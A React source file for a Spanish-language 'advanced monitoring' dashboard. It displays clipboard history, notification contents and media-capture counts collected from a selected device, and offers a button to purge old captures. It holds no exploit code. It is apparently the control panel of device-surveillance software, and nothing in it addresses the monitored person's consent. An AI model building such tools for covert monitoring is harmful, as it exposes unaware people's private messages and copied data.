import { useState } from "react";
import { useAuth } from "@/_core/hooks/useAuth";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import {
  Clipboard,
  Bell,
  Smartphone,
  BarChart3,
  Search,
  Trash2,
  Clock,
  FileText,
} from "lucide-react";

export default function AdvancedMonitoring() {
  const { user } = useAuth();
  const [selectedDeviceId, setSelectedDeviceId] = useState<number | null>(null);
  const [searchQuery, setSearchQuery] = useState("");

  // Queries
  const { data: clipboardHistory, isLoading: clipboardLoading } =
    trpc.advancedMonitoring.getClipboardHistory.useQuery(
      { deviceId: selectedDeviceId || 0, limit: 50 },
      { enabled: !!selectedDeviceId }
    );

  const { data: notifications, isLoading: notificationsLoading } =
    trpc.advancedMonitoring.getNotifications.useQuery(
      { deviceId: selectedDeviceId || 0, limit: 50 },
      { enabled: !!selectedDeviceId }
    );

  const { data: stats } = trpc.advancedMonitoring.getMonitoringStats.useQuery(
    { deviceId: selectedDeviceId || 0 },
    { enabled: !!selectedDeviceId }
  );

  const { data: activitySummary } = trpc.advancedMonitoring.getActivitySummary.useQuery(
    { deviceId: selectedDeviceId || 0, hoursBack: 24 },
    { enabled: !!selectedDeviceId }
  );

  // Mutations
  const cleanup = trpc.advancedMonitoring.cleanupOldCaptures.useMutation();

  const handleSearch = async () => {
    if (!selectedDeviceId || !searchQuery) return;
    toast.info("Búsqueda en clipboard implementada");
  };

  const handleCleanup = async () => {
    if (!selectedDeviceId) return;

    try {
      await cleanup.mutateAsync({
        deviceId: selectedDeviceId,
        daysOld: 30,
      });

      toast.success("Limpieza completada");
    } catch (error) {
      toast.error("Error en la limpieza");
    }
  };

  if (!user) {
    return <div className="p-6">Cargando...</div>;
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-3xl font-bold text-cyan-400 mb-2">Monitoreo Avanzado</h1>
        <p className="text-gray-400">Clipboard, notificaciones y capturas de media</p>
      </div>

      {/* Stats Cards */}
      {stats && (
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          <Card className="bg-gradient-to-br from-purple-900/20 to-purple-900/5 border-purple-500/30">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-medium text-gray-300 flex items-center gap-2">
                <Clipboard className="w-4 h-4 text-purple-400" />
                Clipboard
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-purple-400">
                {stats.totalClipboardEntries}
              </div>
              <p className="text-xs text-gray-500 mt-1">Entradas capturadas</p>
            </CardContent>
          </Card>

          <Card className="bg-gradient-to-br from-cyan-900/20 to-cyan-900/5 border-cyan-500/30">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-medium text-gray-300 flex items-center gap-2">
                <Bell className="w-4 h-4 text-cyan-400" />
                Notificaciones
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-cyan-400">
                {stats.totalNotifications}
              </div>
              <p className="text-xs text-gray-500 mt-1">Notificaciones capturadas</p>
            </CardContent>
          </Card>

          <Card className="bg-gradient-to-br from-magenta-900/20 to-magenta-900/5 border-magenta-500/30">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-medium text-gray-300 flex items-center gap-2">
                <Smartphone className="w-4 h-4 text-magenta-400" />
                Media
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-magenta-400">
                {stats.totalMediaCaptures}
              </div>
              <p className="text-xs text-gray-500 mt-1">Capturas de media</p>
            </CardContent>
          </Card>

          <Card className="bg-gradient-to-br from-green-900/20 to-green-900/5 border-green-500/30">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-medium text-gray-300 flex items-center gap-2">
                <BarChart3 className="w-4 h-4 text-green-400" />
                Actividad
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-green-400">
                {(activitySummary?.clipboardActivity || 0) +
                  (activitySummary?.notificationActivity || 0)}
              </div>
              <p className="text-xs text-gray-500 mt-1">Últimas 24 horas</p>
            </CardContent>
          </Card>
        </div>
      )}

      {/* Main Content */}
      <Card className="bg-gray-900/50 border-gray-700/50">
        <CardHeader>
          <CardTitle className="text-cyan-400">Datos Capturados</CardTitle>
          <CardDescription>Visualiza clipboard, notificaciones y media capturada</CardDescription>
        </CardHeader>
        <CardContent>
          <Tabs defaultValue="clipboard" className="w-full">
            <TabsList className="grid w-full grid-cols-3 bg-gray-800/50">
              <TabsTrigger value="clipboard" className="data-[state=active]:bg-purple-600">
                <Clipboard className="w-4 h-4 mr-2" />
                Clipboard
              </TabsTrigger>
              <TabsTrigger value="notifications" className="data-[state=active]:bg-cyan-600">
                <Bell className="w-4 h-4 mr-2" />
                Notificaciones
              </TabsTrigger>
              <TabsTrigger value="activity" className="data-[state=active]:bg-magenta-600">
                <BarChart3 className="w-4 h-4 mr-2" />
                Actividad
              </TabsTrigger>
            </TabsList>

            {/* Clipboard Tab */}
            <TabsContent value="clipboard" className="space-y-4">
              <div className="flex gap-2">
                <Input
                  placeholder="Buscar en clipboard..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="bg-gray-800 border-gray-700 text-white"
                />
                <Button
                  onClick={handleSearch}
                  className="bg-purple-600 hover:bg-purple-700"
                >
                  <Search className="w-4 h-4" />
                </Button>
              </div>

              {clipboardLoading ? (
                <div className="text-center text-gray-400">Cargando...</div>
              ) : clipboardHistory && clipboardHistory.length > 0 ? (
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {clipboardHistory.map((entry, idx) => (
                    <div
                      key={idx}
                      className="p-3 bg-gray-800/50 border border-gray-700 rounded-lg hover:border-purple-500/50 transition"
                    >
                      <div className="flex items-start justify-between">
                        <div className="flex-1">
                          <Badge className="bg-purple-600/50 text-purple-200 mb-2">
                            {entry.dataType}
                          </Badge>
                          <p className="text-sm text-gray-300 break-words">
                            {entry.contentPreview}
                          </p>
                          <p className="text-xs text-gray-500 mt-1">
                            {new Date(entry.timestamp).toLocaleString()}
                          </p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center text-gray-500 py-8">
                  No hay entradas de clipboard
                </div>
              )}
            </TabsContent>

            {/* Notifications Tab */}
            <TabsContent value="notifications" className="space-y-4">
              {notificationsLoading ? (
                <div className="text-center text-gray-400">Cargando...</div>
              ) : notifications && notifications.length > 0 ? (
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {notifications.map((notif, idx) => (
                    <div
                      key={idx}
                      className="p-3 bg-gray-800/50 border border-gray-700 rounded-lg hover:border-cyan-500/50 transition"
                    >
                      <div className="flex items-start justify-between">
                        <div className="flex-1">
                          <Badge className="bg-cyan-600/50 text-cyan-200 mb-2">
                            {notif.appName}
                          </Badge>
                          <p className="text-sm font-medium text-gray-200">{notif.title}</p>
                          <p className="text-sm text-gray-400">{notif.content}</p>
                          <p className="text-xs text-gray-500 mt-1">
                            {new Date(notif.timestamp).toLocaleString()}
                          </p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center text-gray-500 py-8">
                  No hay notificaciones capturadas
                </div>
              )}
            </TabsContent>

            {/* Activity Tab */}
            <TabsContent value="activity" className="space-y-4">
              {activitySummary ? (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <Card className="bg-gray-800/50 border-gray-700">
                    <CardHeader className="pb-3">
                      <CardTitle className="text-sm">Actividad Reciente (24h)</CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-2">
                      <div className="flex justify-between items-center">
                        <span className="text-sm text-gray-400">Clipboard:</span>
                        <Badge variant="outline">{activitySummary.clipboardActivity}</Badge>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-sm text-gray-400">Notificaciones:</span>
                        <Badge variant="outline">
                          {activitySummary.notificationActivity}
                        </Badge>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-sm text-gray-400">Media:</span>
                        <Badge variant="outline">{activitySummary.mediaActivity}</Badge>
                      </div>
                    </CardContent>
                  </Card>

                  <Card className="bg-gray-800/50 border-gray-700">
                    <CardHeader className="pb-3">
                      <CardTitle className="text-sm">App Más Activa</CardTitle>
                    </CardHeader>
                    <CardContent>
                      {activitySummary.mostActiveApp ? (
                        <div>
                          <p className="text-lg font-semibold text-cyan-400">
                            {activitySummary.mostActiveApp}
                          </p>
                          <p className="text-xs text-gray-500 mt-1">
                            Aplicación con más notificaciones
                          </p>
                        </div>
                      ) : (
                        <p className="text-gray-500">Sin datos</p>
                      )}
                    </CardContent>
                  </Card>

                  {activitySummary.topClipboardTypes &&
                    activitySummary.topClipboardTypes.length > 0 && (
                      <Card className="bg-gray-800/50 border-gray-700 md:col-span-2">
                        <CardHeader className="pb-3">
                          <CardTitle className="text-sm">Tipos de Clipboard</CardTitle>
                        </CardHeader>
                        <CardContent>
                          <div className="space-y-2">
                            {activitySummary.topClipboardTypes.map((item) => (
                              <div key={item.type} className="flex justify-between items-center">
                                <span className="text-sm text-gray-400">{item.type}:</span>
                                <Badge variant="secondary">{item.count}</Badge>
                              </div>
                            ))}
                          </div>
                        </CardContent>
                      </Card>
                    )}
                </div>
              ) : (
                <div className="text-center text-gray-500 py-8">
                  Cargando actividad...
                </div>
              )}
            </TabsContent>
          </Tabs>

          {/* Actions */}
          <div className="mt-6 flex gap-2">
            <Button
              onClick={handleCleanup}
              disabled={cleanup.isPending || !selectedDeviceId}
              variant="outline"
              className="border-gray-700 hover:bg-red-900/20"
            >
              <Trash2 className="w-4 h-4 mr-2" />
              Limpiar Capturas Antiguas
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
